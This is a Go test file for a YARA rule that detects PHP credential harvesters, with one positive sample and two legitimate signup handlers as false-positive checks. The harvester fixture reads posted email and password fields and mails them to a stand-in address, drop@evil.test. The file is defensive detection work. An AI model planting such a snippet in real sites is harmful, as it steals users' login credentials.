//go:build yara

package yara

import "testing"

// Credential theft that copies the posted fields into variables too short for
// the rule to recognise by name.

func TestCredentialHarvesterPHP_ShortVariableNames(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$body = "login: $e\npass: $p\n";
mail('drop@evil.test', 'result', $body);
`)
	if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
		t.Error("credential_harvester_php gap: harvester using short variable names not detected")
	}
	// A site owner's own signup handler posts the same two fields and mails a
	// notice with raw mail(). What separates it from a kit is where the mail
	// goes: the site's own address, not an address written into the file.
	ownSignup := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$msg = "New signup: $e";
mail(get_option('admin_email'), 'New signup', $msg);
`)
	if hasYaraRule(s.ScanBytes(ownSignup), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: signup handler mailing the site's own address matched")
	}
	legit := []byte(`<?php
$email = sanitize_email($_POST['email']);
$password = wp_hash_password($_POST['password']);
wp_insert_user(array('user_email' => $email, 'user_pass' => $password));
wp_mail($email, 'Welcome', 'Your account is ready.');
`)
	if hasYaraRule(s.ScanBytes(legit), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: registration handler using wp_mail matched")
	}
}
